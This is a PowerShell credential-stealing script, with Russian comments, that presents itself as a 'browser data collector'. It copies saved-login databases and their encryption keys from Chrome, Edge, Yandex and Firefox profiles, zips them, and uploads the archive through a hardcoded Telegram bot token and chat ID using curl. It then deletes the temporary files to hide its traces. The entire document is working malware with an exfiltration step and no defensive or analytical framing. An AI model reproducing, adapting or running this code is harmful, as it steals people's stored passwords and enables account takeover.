# [ ===== Extended Browser Data Collector ===== ] #
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$outPath = "$env:TEMP\system_report"
New-Item -ItemType Directory -Path $outPath -Force | Out-Null

# 1. Списки путей для Chromium-браузеров (Chrome, Edge, Yandex)
$chromPaths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
    "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
}

foreach ($browser in $chromPaths.Keys) {
    $base = $chromPaths[$browser]
    $loginData = "$base\Default\Login Data"
    $localState = "$base\Local State"
    
    if (Test-Path $loginData) {
        Copy-Item $loginData -Destination "$outPath\$browser`_LoginData" -Force
        Copy-Item $localState -Destination "$outPath\$browser`_LocalState" -Force
    }
}

# 2. Поиск данных Firefox (профили имеют случайные имена)
$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffBase) {
    $ffProfiles = Get-ChildItem $ffBase -Directory
    foreach ($profile in $ffProfiles) {
        $loginsJson = Join-Path $profile.FullName "logins.json"
        $keyDb = Join-Path $profile.FullName "key4.db" # Ключи шифрования Firefox
        
        if (Test-Path $loginsJson) {
            $pName = $profile.Name
            Copy-Item $loginsJson -Destination "$outPath\FF_$pName`_logins.json" -Force
            Copy-Item $keyDb -Destination "$outPath\FF_$pName`_key4.db" -Force
        }
    }
}

# 3. Упаковка и отправка
$zipFile = "$env:TEMP\logs.zip"
if (Get-ChildItem $outPath) {
    Compress-Archive -Path "$outPath\*" -DestinationPath $zipFile -Force
    & curl.exe -F "chat_id=$chatID" -F "document=@$zipFile" "https://api.telegram.org/bot$token/sendDocument"
    
    # Очистка
    Remove-Item -Recurse -Force $outPath
    Remove-Item -Force $zipFile
}
